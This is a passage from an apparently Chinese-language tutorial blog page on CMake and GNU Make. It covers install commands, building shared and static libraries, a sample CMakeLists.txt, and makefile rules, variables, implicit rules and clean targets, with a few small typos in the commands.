PERMISSIONS，安装后的权限为：OWNER_WRITE, OWNER_READ, GROUP_READ,和 WORLD_READ，即 644 权限。</span><br><br><br><span class="hljs-comment"># 安装非目标文件的可执行文件（脚本等等）</span><br><span class="hljs-keyword">INSTALL</span>(PROGRAMS files... DESTINATION &lt;dir&gt;<br> [PERMISSIONS permissions...]<br> [CONFIGURATIONS [Debug|Release|...]]<br> [COMPONENT &lt;component&gt;]<br> [RENAME &lt;name&gt;] [OPTIONAL])<br><span class="hljs-comment"># 跟上面的 FILES 指令使用方法一样，唯一的不同是安装后权限为:</span><br><span class="hljs-comment"># OWNER_EXECUTE, GROUP_EXECUTE, 和 WORLD_EXECUTE，即 755 权限</span><br><br><span class="hljs-comment"># 安装函数的注意点：</span><br><span class="hljs-comment"># 1. 如果没有cmake -DCMAKE_INSTALL_PREFIX=/tmp/t2/usr .. 也就是说没有指定CMAKE_INSTALL_PREFIX，则默认路径是/usr/local</span><br><span class="hljs-comment"># 2. 在安装目录（属于上述的普通文件）时 如果是 x/ 则是安装x目录下的文件，不包括x；如果是 x 则是包括了x。</span><br><br><span class="hljs-comment">#生成一个动态库或者是静态库，也可以使用</span><br><span class="hljs-keyword">ADD_LIBRARY</span><br> <span class="hljs-keyword">ADD_LIBRARY</span>(libname [SHARED|STATIC|MODULE]<br> [EXCLUDE_FROM_ALL]<br> source1 source2 ... sourceN)<br></code></pre></td></tr></table></figure><div class="note note-warning">            <p>在Cmake中使用变量的值的一般方法是<code>%{}</code>，但是在<code>if</code>语句中使用变量只需直接使用变量名即可，无需使用<code>%{}</code></p>          </div><h2 id="语法规则小总结"><a href="#语法规则小总结" class="headerlink" title="语法规则小总结"></a>语法规则小总结</h2><p>最简单的语法规则是：</p><ol><li>变量使用${}方式取值，但是在 IF 控制语句中是直接使用变量名</li><li>指令(参数 1 参数 2…)</li></ol><p><strong>参数使用括弧括起，参数之间使用空格或分号分开。</strong></p><p>以上面的 ADD_EXECUTABLE 指令为例，如果存在另外一个 func.c 源文件，就要写成：</p><p>ADD_EXECUTABLE(hello main.c func.c)或者</p><p>ADD_EXECUTABLE(hello main.c;func.c)</p><ol start="3"><li>指令是大小写无关的，参数和变量是大小写相关的。但，推荐你全部使用大写指令。</li></ol><div class="note note-warning">            <p>需要注意的是Cmake的语法是比较灵活的，比如说：在包含文件名的时候可以使用””将文件名包裹，但是不使用也是可以的，但如果文件名中有空格的话就必须使用””。同时在函数中分隔参数可以使用空格分隔，也可以使用,分隔。注意这里不是所有的参数都是用,分隔。而是同类型的参数之间，比如说文件名之间。</p>          </div><h2 id="构建过程"><a href="#构建过程" class="headerlink" title="构建过程"></a>构建过程</h2><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Cmake"><span class="hljs-comment"># 将规则写在CMakeList.txt文件中，需要注意大小写。</span><br><br>mkdir build <br><span class="hljs-comment"># 创建一个build文件夹，将Cmake生成的文件放在此文件下</span><br>cd ./build<br><span class="hljs-comment"># 切换到build文件夹下</span><br>cmake ..<br><span class="hljs-comment"># 生成Makefile等文件</span><br>make<br><span class="hljs-comment"># 执行make程序，你可以用 cmake --build . 替换 make 这一行。</span><br><br><span class="hljs-comment"># 上面的步骤也可以使用一下两条命令替代</span><br>cmake -S . -B build<br>cmake --build build<br><br><span class="hljs-comment"># 一下的任意一条指令都可以完成安装</span><br><span class="hljs-comment"># From the build directory (pick one)</span><br>make <span class="hljs-keyword">install</span><br>cmake --build . --<span class="hljs-keyword">target</span> <span class="hljs-keyword">install</span><br>cmake --<span class="hljs-keyword">install</span> . <span class="hljs-comment"># CMake 3.15+ only</span><br><span class="hljs-comment"># From the source directory (pick one)</span><br>make -C build <span class="hljs-keyword">install</span><br>cmake --build build --<span class="hljs-keyword">target</span> <span class="hljs-keyword">install</span><br>cmake --<span class="hljs-keyword">install</span> build <span class="hljs-comment"># CMake 3.15+ only</span><br></code></pre></td></tr></table></figure><hr><h1 id="构建动态库和静态库"><a href="#构建动态库和静态库" class="headerlink" title="构建动态库和静态库"></a>构建动态库和静态库</h1><h2 id="动态库"><a href="#动态库" class="headerlink" title="动态库"></a>动态库</h2><p>我们知道可以直接使用:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -fPLC -share -o libtest.so 1.c 2.c 3.c或者是：<br><br>gcc -fPIC -c func.c -o func.o<br>gcc -shared func.o -o libfunc.so<br></code></pre></td></tr></table></figure><p><code>Cmake</code>方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#首先创建一个新的文件夹t3，t3中mkdir lib 。在t3目录中touch CMakeLists.txt中添加：</span><br>ROJECT(HELLOLIB) <span class="hljs-comment">#创建一个新的项目</span><br>ADD_SUBDIRECTORY(lib) <span class="hljs-comment">#引入lib子目录</span><br><br><span class="hljs-comment">#在lib中vim CMakeLists.txt添加:</span><br>SET(LIBHELLO hello.c)<br>ADD_LIBRARY(hello SHARED <span class="hljs-variable">$&#123;LIBHELLO&#125;</span>)<br><br><span class="hljs-comment">#使用外部编译，mkdir Build cd BUild </span><br><br>此时可以在lib中找到HELLOLIB.so<br><br><span class="hljs-comment">#如果你要指定 libhello.so 生成的位置，可以通过在主工程文件 CMakeLists.txt 中修改 ADD_SUBDIRECTORY(lib)指令来指定一个编译输出位置或者在 lib/CMakeLists.txt 中添加SET(LIBRARY_OUTPUT_PATH &lt;路径&gt;)来指定一个新的位置。</span><br><span class="hljs-comment">#这两者的区别我们上一节已经提到了，所以，这里不再赘述，下面，我们解释一下一个新的指令 </span><br><br>ADD_LIBRARY<br> ADD_LIBRARY(libname [SHARED|STATIC|MODULE]<br> [EXCLUDE_FROM_ALL]<br> source1 source2 ... sourceN)<br><span class="hljs-comment">#你不需要写全 libhello.so，只需要填写 hello 即可，cmake 系统会自动为你生成libhello.X</span><br><br><span class="hljs-comment">#设置共享库的版本号：</span><br>SET_TARGET_PROPERTIES(hello PROPERTIES VERSION 1.2 SOVERSION 1)<br>VERSION 指代动态库版本，SOVERSION 指代 API 版本。<br><br>将上述指令加入 lib/CMakeLists.txt 中，重新构建看看结果。<br>在 build/lib 目录会生成：<br>libhello.so.1.2<br>libhello.so.1-&gt;libhello.so.1.2<br>libhello.so -&gt;libhello.so.1<br></code></pre></td></tr></table></figure><hr><h2 id="制作静态库"><a href="#制作静态库" class="headerlink" title="制作静态库"></a>制作静态库</h2><p>我们知道可以直接使用<code>gcc</code>命令制作静态库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -c 1.c 2.c <br>ar rsc test.a ./1.o ./2.o<br><br>ar 是 Linux 的一个备份压缩命令，它可以将多个文件打包成一个备份文件（也叫归档文件），也可以从备份文件中提取成员文件，最常见的用法是将目标文件打包为静态链接库。<br><br>对参数的说明：<br><br>参数 r 用来替换库中已有的目标文件，或者加入新的目标文件。<br>参数 c 表示创建一个库。不管库否存在，都将创建。<br>参数 s 用来创建目标文件索引，这在创建较大的库时能提高速度。<br><br>不管是静态库或者是动态库都是由.o文件构成的。<br></code></pre></td></tr></table></figure><p>但是当有很多源文件的时候，我们在使用这种方法就很不方便了。于是<code>cmake</code>支持创建静态库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用到的指令：</span><br>使用指令和制作动态库是一致的，只是需要将动态参数换成静态参数。唯一需要注意的是两种库的同名问题，如果我们使用函数ADD_LIBRARY(hello STATIC <span class="hljs-variable">$&#123;LIBHELLO_SRC&#125;</span>)来构建动态库，会造成一个同名的报错（因为函数的target是唯一的）。解决方法有将某一个库的名字改成另一个。如果要求两种库同名的话可以使用函数：<br><br>SET_TARGET_PROPERTIES，其基本语法是：<br> SET_TARGET_PROPERTIES(target1 target2 ...<br> PROPERTIES prop1 value1<br> prop2 value2 ...)<br><br><span class="hljs-comment">#这条指令可以用来设置输出的名称，对于动态库，还可以用来指定动态库版本和 API 版本。</span><br><br>在本例中，我们需要作的是向 lib/CMakeLists.txt 中添加一条：<br>SET_TARGET_PROPERTIES(hello_static PROPERTIES OUTPUT_NAME <span class="hljs-string">&quot;hello&quot;</span>)这样，我们就可以同时得到 libhello.so/libhello.a 两个库了。<br><br>与他对应的指令是：<br>GET_TARGET_PROPERTY(VAR target property)<br>具体用法如下例，我们向 lib/CMakeListst.txt 中添加：<br>GET_TARGET_PROPERTY(OUTPUT_VALUE hello_static OUTPUT_NAME)<br>MESSAGE(STATUS “This is the hello_static<br>OUTPUT_NAME:”<span class="hljs-variable">$&#123;OUTPUT_VALUE&#125;</span>)<br>如果没有这个属性定义，则返回 NOTFOUND.<br><br></code></pre></td></tr></table></figure><h2 id="使用动态库-静态库"><a href="#使用动态库-静态库" class="headerlink" title="使用动态库&amp;静态库"></a>使用动态库&amp;静态库</h2><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-comment">#表示注释   </span><br><span class="hljs-comment">#cmake file for project association</span><br><br><span class="hljs-comment">#cmake 最低版本要求，低于2.8 构建过程会被终止。   </span><br><span class="hljs-keyword">CMAKE_MINIMUM_REQUIRED</span>(VERSION <span class="hljs-number">2.8</span>)<br><br><span class="hljs-comment">#定义工程名称</span><br><span class="hljs-keyword">PROJECT</span>(association)<br>                     <br><span class="hljs-comment">#打印相关消息消息   </span><br><span class="hljs-comment">#MESSAGE(STATUS &quot;Project: $&#123;PROJECT_NAME&#125;&quot;)</span><br><span class="hljs-comment">#MESSAGE(STATUS &quot;Project Directory: $&#123;PROJECT_SOURCE_DIR&#125;&quot;)  </span><br><br><span class="hljs-comment">#指定编译类型debug版</span><br><span class="hljs-keyword">SET</span>(CMAKE_BUILE_TYPE DEBUG)<br><span class="hljs-comment">#发行版</span><br><span class="hljs-comment">#SET(CMAKE_BUILE_TYPE RELEASE)</span><br><br><span class="hljs-comment">#SET(CMAKE_C_FLAGS_DEBUG &quot;-g -Wall&quot;)          #C</span><br><span class="hljs-comment">#SET(CMAKE_CXX_FLAGS_DEBUG &quot;-g -Wall&quot;)           #C++</span><br><br><span class="hljs-comment">#设置C++ 编译</span><br><span class="hljs-keyword">SET</span>(CMAKE_CXX_FLAGS <span class="hljs-string">&quot;$&#123;CMAKE_CXX_FLAGS&#125; -std=c++11 -s -Wall -W -O3&quot;</span>)   <br> <br><span class="hljs-comment">#添加子目录   </span><br><span class="hljs-keyword">ADD_SUBDIRECTORY</span>(src/<span class="hljs-keyword">include</span>)<br><br><span class="hljs-comment">#设置变量，表示所有的源文件  </span><br><span class="hljs-keyword">SET</span>(SOURCE_FILES<br>    src/main.cpp    <br>    )<br><br><br><span class="hljs-comment">#配置相关库文件的目录，  </span><br><span class="hljs-keyword">LINK_DIRECTORIES</span>(                                  <br>    /usr/local/lib<br>    )  <br><br><span class="hljs-comment">#找BZip2</span><br><span class="hljs-keyword">FIND_PACKAGE</span>(BZip2)<br><span class="hljs-keyword">if</span> (BZIP2_FOUND)<br>    <span class="hljs-keyword">MESSAGE</span>(STATUS <span class="hljs-string">&quot;$&#123;BZIP_INCLUDE_DIRS&#125;&quot;</span>)  <br>    <span class="hljs-keyword">MESSAGE</span>(STATUS <span class="hljs-string">&quot; $&#123;BZIP2_LIBRARIES&#125;&quot;</span>)  <br><span class="hljs-keyword">endif</span> (BZIP2_FOUND)<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">NOT</span> BZIP2_FOUND)<br>    <span class="hljs-keyword">MESSAGE</span>(STATUS <span class="hljs-string">&quot;NOT  BZIP2_FOUND&quot;</span>)  <br><span class="hljs-keyword">endif</span> (<span class="hljs-keyword">NOT</span>  BZIP2_FOUND)<br><br><br><span class="hljs-comment">#相关头文件的目录</span><br><span class="hljs-keyword">INCLUDE_DIRECTORIES</span>(  <br>     /usr/local/<span class="hljs-keyword">include</span>  <br>     <span class="hljs-variable">$&#123;PROJECT_SOURCE_DIR&#125;</span>/utility_inc<br>     <span class="hljs-variable">$&#123;BZIP_INCLUDE_DIRS&#125;</span><br>    )<br><br><span class="hljs-comment">#链接库</span><br><span class="hljs-keyword">LINK_LIBRARIES</span>(<br>    <span class="hljs-variable">$&#123;PROJECT_SOURCE_DIR&#125;</span>/static_libs/libSentinelKeys64.a<br>    <span class="hljs-variable">$&#123;BZIP2_LIBRARIES&#125;</span><br>    )<br><br><span class="hljs-comment">#生成可执行文件</span><br><span class="hljs-keyword">ADD_EXECUTABLE</span>(<span class="hljs-variable">$&#123;PROJECT_NAME&#125;</span> <span class="hljs-variable">$&#123;SOURCE_FILES&#125;</span>)<br><br><span class="hljs-comment">#依赖的库文件  </span><br><span class="hljs-keyword">TARGET_LINK_LIBRARIES</span>(<span class="hljs-variable">$&#123;PROJECT_NAME&#125;</span> eventloop)<br></code></pre></td></tr></table></figure><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="本地变量"><a href="#本地变量" class="headerlink" title="本地变量"></a>本地变量</h2><p><strong>注意，Cmake本身就制定了一些变量，这里变量都是大写的。</strong></p><p><a href="https://modern-cmake-cn.github.io/Modern-CMake-zh_CN/chapters/basics/variables.html#fn_1">https://modern-cmake-cn.github.io/Modern-CMake-zh_CN/chapters/basics/variables.html#fn_1</a></p><p>小总结：</p><ol><li>CMake具有作用域的概念</li></ol><h2 id="内部编译和外部编译"><a href="#内部编译和外部编译" class="headerlink" title="内部编译和外部编译"></a>内部编译和外部编译</h2><p>这两者的区别就是，内部编译是在源文件目录中直接<code>make</code>，而外部编译是在其他目录中（一般是Build）目录下 <code>Cmake</code>的。这两者的主要区别就是在内部编译中，编译所生成的中间文件都会留在源文件中，而外部编译不会。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>CMake中的安装需要使用一个函数：<code>INSTALL</code>。安装的内容可以包括目标二进制、动态库、静态库以及文件、目录、脚本等。这个函数一般和<code>CMAKE_INSTALL_PREFIX</code>变量一起使用。</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a href="https://www.gnu.org/software/make/">GNU Make</a>用于控制如何从程序的源代码文件编译并链接为可执行文件，通过<code>make</code>命令从名称为<code>makefile</code>的文件中获取构建信息，该文件定义了一系列规则来指定源文件的编译先后顺序、是否需要重新编译、甚至于进行更为复杂的操作。通过<code>makefile</code>文件可以方便的实现工程的自动化编译，只需要执行<code>make</code>命令即可完成编译动作，从而极大的提高了开发人员的工作效率。</p><p><a href="http://www.uinio.com/Linux/CMake/logo.png"><img src="http://www.uinio.com/Linux/CMake/logo.png"></a></p><p><a href="https://cmake.org/cmake/help/v3.17/">CMake 3.17</a>是一款源代码构建管理工具，最初作为各种 <strong>Makefile</strong> 方言的生成器，后来逐步发展为现代化的构建系统，广泛用于 C 和 C++ 工程源代码的构建。官方提供的<a href="https://cmake.org/cmake/help/latest/guide/tutorial/index.html">《CMake Tutorial》</a> 为开发人员提供了一个循序渐进的指南，涵盖了 CMake 构建过程中常见问题的解决方案。如果需要构建从第三方发布的源代码包，则可以参考<a href="https://cmake.org/cmake/help/v3.17/guide/user-interaction/index.html">《User Interaction Guide》</a>。而<a href="https://cmake.org/cmake/help/v3.17/guide/using-dependencies/index.html#guide:Using%20Dependencies%20Guide">《Using Dependencies Guide》</a>则主要针对需要使用第三方库的开发人员。</p><h2 id="GNU-Make"><a href="#GNU-Make" class="headerlink" title="GNU Make"></a>GNU Make</h2><p><code>make</code>是一款用于解释<code>makefile</code>文件当中命令的工具，而<code>makefile</code>关系到整个工程的编译规则。许多 IDE 集成开发环境都整合了该命令，例如：Visual C++ 里的<strong>nmake</strong>，Linux 里的 <strong>GNU make</strong>，本章节主要讲解 <strong>GNU make</strong> 相关的内容。开始进一步讲解之前，需要先了解一下 C&#x2F;C++ 源代码的编译过程，具体内容可参见笔者的<a href="http://www.uinio.com/Linux/GCC.html#%E7%BC%96%E8%AF%91%E6%AD%A5%E9%AA%A4">《基于 Linux 的 GCC 与 GDB 应用调试》 - 编译步骤</a>一文：</p><p><a href="http://www.uinio.com/Linux/CMake/GNU-Make/0.png"><img src="http://www.uinio.com/Linux/CMake/GNU-Make/0.png"></a></p><ol><li><strong>预处理 Preprocessing</strong>：解析各种预处理命令，包括头文件包含、宏定义的扩展、条件编译的选择等；</li><li><strong>编译 Compiling</strong>：对预处理之后的源文件进行翻译转换，产生由机器语言描述的汇编文件；</li><li><strong>汇编 Assembly</strong>：将汇编代码转译成为机器码；</li><li><strong>链接 Link</strong>：将机器码中的各种符号引用与定义转换为可执行文件内的相应信息（例如虚拟地址）；</li></ol><h3 id="makefile-文件"><a href="#makefile-文件" class="headerlink" title="makefile 文件"></a>makefile 文件</h3><h4 id="基本规则"><a href="#基本规则" class="headerlink" title="基本规则"></a>基本规则</h4><p>执行<code>make</code>命令时，实际会解析当前目录下的<code>makefile</code>文件，该文件用于告知<code>make</code>命令如何对源代码进行编译与链接，一个 makefile 的基本编写规则如下所示：</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></pre></td><td><pre><span>target ... : prerequisites ...</span><br><span>    command</span><br><span>    ...</span><br><span>    ...</span><br></pre></td></tr></tbody></table><ul><li><code>target</code>：即可以是 1 个目标文件，也可以是 1 个执行文件，甚至还可以是 1 个标签；</li><li><code>prerequisites</code>：生成该<code>target</code> 所依赖的文件或者其它<code>target</code>；</li><li><code>command</code>：该<code>target</code>所要执行的 Shell 命令，需要保持 1 个【Tab】的缩进；</li></ul><p>上述的基本编写规则最终会形成一套依赖关系，其中**<code>target</code>依赖于<code>prerequisites</code>，而生成规则定义在<code>command</code>；如果<code>prerequisites</code>中的文件比<code>target</code>上的文件要新，则<code>command</code>所定义的命令就会被执行**。</p><p>观察下面的例子，其中的反斜杠<code>\</code>表示换行，将其保存为一个<code>makefile</code>或者<code>Makefile</code>文件，然后在当前目录执行<code>make</code>命令，就可以生成可执行文件<code>app</code>。如果需要删除可执行文件以及中间生成的目标文件，则执行<code>make clean</code>命令即可。</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></pre></td><td><pre><span>app : main.o kbd.o command.o display.o insert.o search.o files.o utils.o</span><br><span>    gcc -o app main.o kbd.o command.o display.o insert.o search.o files.o utils.o</span><br><span></span><br><span>main.o : main.c defs.h</span><br><span>    gcc -c main.c</span><br><span>kbd.o : kbd.c defs.h command.h</span><br><span>    gcc -c kbd.c</span><br><span>command.o : command.c defs.h command.h</span><br><span>    gcc -c command.c</span><br><span>display.o : display.c defs.h buffer.h</span><br><span>    gcc -c display.c</span><br><span>insert.o : insert.c defs.h buffer.h</span><br><span>    gcc -c insert.c</span><br><span>search.o : search.c defs.h buffer.h</span><br><span>    gcc -c search.c</span><br><span>files.o : files.c defs.h buffer.h command.h</span><br><span>    gcc -c files.c</span><br><span>utils.o : utils.c defs.h</span><br><span>    gcc -c utils.c</span><br><span>clean :</span><br><span>    rm app main.o kbd.o command.o display.o \</span><br><span>       insert.o search.o files.o utils.o</span><br></pre></td></tr></tbody></table><p>输入<code>make</code>命令之后，就会开始执行上述的<code>makefile</code>文件，具体执行流程如下所示：</p><ol><li><code>make</code>会在当前目录下查找<code>Makefile</code>或者<code>makefile</code>文件；</li><li>找到后将当中定义的第 1 个<code>target</code>作为最终的目标文件；</li><li>如果<code>app</code>文件不存在，或者其依赖的<code>.o</code>文件修改时间要比<code>app</code>执行文件更新。那么，他就会执行<code>command</code>定义的命令来生成<code>app</code>文件；</li><li>如果<code>app</code>依赖的<code>.o</code>文件也不存在，那么查找<code>.o</code>文件对应的依赖规则生成<code>.o</code>文件；</li><li>最后，基于工程中<code>.c</code>和<code>.h</code>源文件生成<code>.o</code>依赖文件，然后再基于这些<code>.o</code>文件生成<code>app</code>执行文件；</li></ol><h4 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h4><p>上面示例中<code>app</code>生成规则中的一系列<code>.o</code>文件反复出现，这里我们可以将其声明为一个变量：</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></pre></td><td><pre><span>objects = main.o kbd.o command.o display.o insert.o search.o files.o utils.o</span><br><span></span><br><span>app : <span>$(objects)</span></span><br><span>    cc -o app <span>$(objects)</span></span><br><span>main.o : main.c defs.h</span><br><span>    cc -c main.c</span><br><span>kbd.o : kbd.c defs.h command.h</span><br><span>    cc -c kbd.c</span><br><span>command.o : command.c defs.h command.h</span><br><span>    cc -c command.c</span><br><span>display.o : display.c defs.h buffer.h</span><br><span>    cc -c display.c</span><br><span>insert.o : insert.c defs.h buffer.h</span><br><span>    cc -c insert.c</span><br><span>search.o : search.c defs.h buffer.h</span><br><span>    cc -c search.c</span><br><span>files.o : files.c defs.h buffer.h command.h</span><br><span>    cc -c files.c</span><br><span>utils.o : utils.c defs.h</span><br><span>    cc -c utils.c</span><br><span>clean :</span><br><span>    rm app <span>$(objects)</span></span><br></pre></td></tr></tbody></table><h4 id="自动推导"><a href="#自动推导" class="headerlink" title="自动推导"></a>自动推导</h4><p>GNU Make 可以自动识别并推导目标与依赖关系之后的<code>command</code>命令，只要<code>make</code>发现 1 个<code>.o</code>文件，就会自动将对应的<code>.c</code>文件添加至依赖关系当中，同时也会将对应的<code>gcc -c</code>命令推导出来。</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></pre></td><td><pre><span>objects = main.o kbd.o command.o display.o \</span><br><span>    insert.o search.o files.o utils.o</span><br><span></span><br><span>app : <span>$(objects)</span></span><br><span>    cc -o app <span>$(objects)</span></span><br><span></span><br><span>main.o : defs.h</span><br><span>kbd.o : defs.h command.h</span><br><span>command.o : defs.h command.h</span><br><span>display.o : defs.h buffer.h</span><br><span>insert.o : defs.h buffer.h</span><br><span>search.o : defs.h buffer.h</span><br><span>files.o : defs.h buffer.h command.h</span><br><span>utils.o : defs.h</span><br><span></span><br><span>.PHONY : clean</span><br><span>clean :</span><br><span>    rm app <span>$(objects)</span></span><br></pre></td></tr></tbody></table><p>这种方法被称为<code>make</code>的<strong>隐含规则</strong>，上述代码中<code>.PHONY</code>表示<code>clean</code>是一个<strong>伪目标文件</strong>，关于隐晦规则和伪目标文件的内容后续将会进行更为详细的介绍。</p><p>通过<strong>隐含规则</strong>可以进一步简化上面的<code>makefile</code>，这样虽然可以最大幅度减少代码，但是文件的依赖关系显得较为凌乱，所以这种风格较少被采用。</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></pre></td><td><pre><span>objects = main.o kbd.o command.o display.o insert.o search.o files.o utils.o</span><br><span></span><br><span>app : <span>$(objects)</span></span><br><span>    cc -o app <span>$(objects)</span></span><br><span></span><br><span><span>$(objects)</span> : defs.h</span><br><span>kbd.o command.o files.o : command.h</span><br><span>display.o insert.o search.o files.o : buffer.h</span><br><span></span><br><span>.PHONY : clean</span><br><span>clean :</span><br><span>    rm app <span>$(objects)</span></span><br></pre></td></tr></tbody></table><h4 id="清理中间文件"><a href="#清理中间文件" class="headerlink" title="清理中间文件"></a>清理中间文件</h4><p>习惯上，每个<code>makefile</code>文件都应该编写一个用于清理中间文件的规则，这样不仅便于重新编译，也有利于保持工程的整洁。</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span><span>clean:</span></span><br><span>    rm edit <span>$(objects)</span></span><br></pre></td></tr></tbody></table><p>之前代码采用了上面较为简单粗暴的方式，但是更为稳健的方法是采用下面这样的风格：</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br></pre></td><td><pre><span>.PHONY : clean</span><br><span>clean :</span><br><span>    -rm edit <span>$(objects)</span></span><br></pre></td></tr></tbody></table><p><code>.PHONY</code>关键字用于表标识<code>clean</code>是一个<strong>伪目标</strong>，<code>rm</code>命令前的小减号<code>-</code>表示忽略操作出现问题的文件，习惯上会将<code>clean</code>放置在<code>makefile</code>的最后。</p><h4 id="Makefile-组成"><a href="#Makefile-组成" class="headerlink" title="Makefile 组成"></a>Makefile 组成</h4><p>Makefile 文件主要包含<strong>显式规则</strong>、<strong>隐式规则</strong>、<strong>变量定义</strong>、<strong>文件指示</strong>、<strong>注释</strong>。</p><ul><li><strong>显式规则</strong>：由<code>Makefile</code>编写者明确指定，用于描述如何生成<code>target</code>；</li><li><strong>隐式规则</strong>：利用<code>make</code>命令的自动推导功能，简略书写<code>Makefile</code>；</li><li><strong>变量的定义</strong>：通常为字符串，当<code>Makefile</code>被执行时，其中的变量会扩散到相应的引用位置；</li><li><strong>文件指示</strong>：在<code>Makefile</code>当中引用另外的<code>Makefile</code>，类似于 C 语言里的<code>#include</code>。或者根据条件指定<code>Makefile</code>的有效部分，类似于 C 语言中的<code>#if</code>。除此之外，还可以用于定义一条拥有多行的命令；</li><li><strong>注释</strong>：注释采用<code>#</code>字符，需要时可以采用反斜杠进行转义<code>\#</code>；</li></ul><blockquote><p><strong>注意</strong>：<code>Makefile</code>中的命令<code>command</code>必须以【Tab】键开始。</p></blockquote><h4 id="引用其它-Makefile"><a href="#引用其它-Makefile" class="headerlink" title="引用其它 Makefile"></a>引用其它 